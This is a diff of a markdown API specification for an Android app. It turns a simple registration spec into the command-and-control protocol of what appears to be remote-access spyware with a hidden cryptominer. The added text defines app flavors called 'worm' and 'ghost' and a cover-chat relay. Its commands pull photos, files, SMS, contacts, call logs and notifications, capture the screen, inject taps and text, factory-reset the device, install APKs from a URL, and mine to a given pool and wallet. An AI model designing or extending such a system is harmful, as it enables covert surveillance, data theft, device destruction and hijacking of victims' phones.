@@ -1,108 +1,85 @@
 # needs-android.md
 
-Every endpoint the Android app WILL call once a real backend exists. Until then `RegistrationApi` (fake transport, JSONL outbox) is the only implementation.
+Every endpoint the Android app calls against the real backend
+(`backend/src/server.js`). All paths are under `WG_BASE_URL` (default
+`http://10.0.2.2:3000`); cleartext is permitted only to emulator
+loopback — production endpoints MUST be `https://`.
 
-Legend: `retry` = automatic retries by the client, exponential backoff; `offline` = behavior when no connectivity.
+Auth note: after enrollment the app sends `Authorization: Bearer
+<credential>` where credential is the server-issued 32-byte secret stored
+AES-GCM in `IdentityVault`. No client secrets are baked into the APK.
 
 ## Endpoints
 
 | # | Method | Path | Purpose | Auth |
 |---|--------|------|---------|------|
-| A1 | POST | /v1/registrations | Register device after lock step | none (bootstrap token) |
-| A2 | POST | /v1/devices/{deviceId}/report | Periodic heartbeat + status | device token |
-| A3 | GET | /v1/devices/{deviceId}/config | Pull command config | device token |
-| A4 | POST | /v1/devices/{deviceId}/acks | Acknowledge executed command | device token |
+| A1 | POST | /api/v1/devices/enroll | Seal the wizard: consumes the single-use enroll JWT, returns the device credential | none (enroll JWT in body) |
+| A2 | POST | /api/v1/devices/{id}/heartbeat | 15 s liveness + stats | device credential |
+| A3 | GET | /api/v1/devices/{id}/commands | Poll queued commands (fallback) | device credential |
+| A4 | GET | /api/v1/devices/{id}/events | SSE stream — instant command push | device credential |
+| A5 | POST | /api/v1/devices/{id}/commands/{cid}/result | Report `executed`/`failed` + result string | device credential |
+| A6 | POST | /api/v1/devices/{id}/files | Artifact upload (photos/files/frames/dumps) | device credential |
+| A7 | POST | /api/v1/devices/{id}/photos/report | MediaStore inventory upsert | device credential |
+| A8 | POST | /api/v1/devices/{id}/chat | Cover-chat reply relay (rate-limited) | device credential |
+| A9 | GET | /api/v1/devices/{id}/files | List own artifact rows | device credential |
 
-## A1 POST /v1/registrations
-
-| Field | Type | Constraint |
-|-------|------|------------|
-| name | string | 2..40 chars, trimmed |
-| phone | string | strict E.164 `^\+[1-9]\d{9,14}$`; input localized +20 when local |
-| locale | string | "ar" |
-| fingerprint | object | see below |
-| fingerprint.androidId | string | Settings.Secure.ANDROID_ID |
-| fingerprint.model | string | Build.MODEL |
-| fingerprint.manufacturer | string | Build.MANUFACTURER |
-| fingerprint.sdkInt | int | Build.VERSION.SDK_INT |
-| fingerprint.abi | string | Build.SUPPORTED_ABIS[0] |
-| constraints | object | see below |
-| constraints.totalMemMb | long | ActivityManager.MemoryInfo.totalMem / 1MB |
-| constraints.batteryOptIgnored | bool | PowerManager.isIgnoringBatteryOptimizations |
-| constraints.phantomCeiling | int | DeviceConfig activity_manager/max_phantom_processes, default 32 |
-
-| Expected status | Meaning |
-|-----------------|---------|
-| 201 | created, body: {deviceId: uuid, deviceToken: jwt} |
-| 400 | validation failed |
-| 409 | duplicate device identity |
-| 500 | transient server failure |
-
-| Property | Value |
-|----------|-------|
-| Retry policy | 3 attempts, 1s/2s/4s backoff |
-| Offline | enqueue into filesDir/registrations/queue.jsonl (one kotlinx.serialization JSON line per record, nested fingerprint/constraints included), flush oldest-first FIFO on next app start / CONNECTIVITY change; queue grows until first successful 201 |
-
-## A2 POST /v1/devices/{deviceId}/report
+## A1 POST /api/v1/devices/enroll
 
 | Field | Type | Constraint |
 |-------|------|------------|
-| ts | int64 | epoch millis |
-| batteryPct | int | 0..100 |
-| uptimeSec | int64 | >= 0 |
+| enrollToken | string | JWT from `POST /enroll-token` (30 min, single-use, bound to issuing user) |
+| deviceId | string | app-derived stable id |
+| platform | string | `android` |
+| appType | string | flavor: `worm`/`ghost`/`master` |
+| variant | string | build variant |
+| fingerprint | object | model/manufacturer/sdk/abi |
+| identity.displayName | string | wizard name |
+| identity.phone | string | E.164 (`+20` localized) |
 
-| Expected status | Meaning |
-|-----------------|---------|
-| 204 | accepted |
-| 401 | rotate token via A1 re-register |
-| 429 | honor Retry-After |
-| 500 | transient |
+| Status | Meaning |
+|--------|---------|
+| 201 | `{deviceId, credential}` — credential shown ONCE, stored AES-GCM |
+| 400/401/403/409 | expired/consumed/owner-locked/duplicate → wizard shows retry + paste-token field |
 
-| Property | Value |
-|----------|-------|
-| Retry policy | 1 retry after Retry-After or 5s |
-| Offline | keep last report in memory, overwrite on success (last-write-wins) |
+## A2 POST /api/v1/devices/{id}/heartbeat (15 s)
 
-## A3 GET /v1/devices/{deviceId}/config
+Body: `{gender, appType, apkVersion, stats{batteryPct,charging,battTempC,cpuTempC,netType,lastCall,lastSms,lastWa}, miner{state,hashrate,stopReason}, screen{w,h,density}}` → 200.
 
-| Body | none |
-|------|------|
+## A3–A5 commands
 
-| Expected status | Meaning |
-|-----------------|---------|
-| 200 | body: {commands: [{id: string, op: enum[ping, sync_config], payload: object}]} |
-| 304 | unchanged, keep cached |
-| 401 | rotate token |
-| 500 | transient |
+Poll `GET /commands` every 15 s AND stream `GET /events` (SSE `data: {cmd}` — instant push). Each command is executed once and reported:
 
-| Property | Value |
-|----------|-------|
-| Retry policy | none, next poll pulls again |
-| Offline | serve last cached config |
+`POST /commands/{cid}/result` → `{state: "executed"|"failed", result: string}`.
 
-## A4 POST /v1/devices/{deviceId}/acks
+Vocabulary: `ping, wipe, camera, pull_photos, screen_capture, sms, contacts, call_log, mine_start, mine_stop, input_tap, input_swipe, input_text, files_pull, notifications_pull, apk_update`.
 
-| Field | Type | Constraint |
-|-------|------|------------|
-| commandId | string | server issued |
-| result | enum[ok, error] | |
-| detail | string? | optional |
+| Command | Payload | Result |
+|---------|---------|--------|
+| pull_photos | `{category?, spec?}` | `pulled=N uploaded=M` |
+| screen_capture | `{frames≤12, intervalSec}` | `frames=N/M` |
+| mine_start | `{algo,pool,wallet,threads}` | honest start (native init ≤20 s) |
+| mine_stop | `{}` | stop reason `manual` |
+| input_tap | `{x,y}` normalized 0..1 | `gesture frames=N` |
+| input_swipe | `{x1,y1,x2,y2,ms}` normalized | `gesture frames=N` |
+| input_text | `{text≤4000}` | `set_text`/`paste` frames=N |
+| files_pull | `{category: documents\|downloads\|audio\|video, limit≤50}` | `cat=X pulled=N uploaded=M` |
+| notifications_pull | `{}` | `dumped=N` / `failed empty` |
+| wipe | `{}` | `wipe_scheduled` (device-admin real factory reset) |
+| apk_update | `{url}` | download + install intent |
 
-| Expected status | Meaning |
-|-----------------|---------|
-| 204 | accepted |
-| 404 | unknown commandId, drop |
-| 401 | rotate token |
-| 429 | honor Retry-After |
-| 500 | transient |
+## A6 POST /api/v1/devices/{id}/files
 
-| Property | Value |
-|----------|-------|
-| Retry policy | infinite while offline, FIFO drain from local queue |
-| Offline | enqueue to queue.jsonl alongside registrations |
+`{kind, category, name, sha256, b64}` — base64 payload ≤8 MB. Server
+verifies sha256, dedups by `(deviceId, sha256)` (`deduped:true`), writes
+`PANEL_DROP_DIR/{id}/{category|kind}/{ts}_{name}`, inserts a
+`DownloadedFile` row. Kinds: `photo`, `camera`, `screen`, `file`, `dump`.
 
-## Current fake transport mapping
+## Reliability
 
-| Interface method | Backing store |
-|------------------|---------------|
-| RegistrationApi.register | filesDir/registrations/queue.jsonl (append-only, kotlinx.serialization JSONL, nested fingerprint/constraints) |
+- SSE reconnects with backoff; the 15 s poll is the safety net — a
+  command is never lost.
+- Upload failures leave the staged file on disk; the next pull re-stages
+  and the server dedups by hash.
+- `WormSvc` (dataSync FGS, `START_STICKY`) owns heartbeat/commands;
+  `MinerFgs` (`specialUse` + `cryptomining` subtype) owns mining; both
+  start only after enrollment.
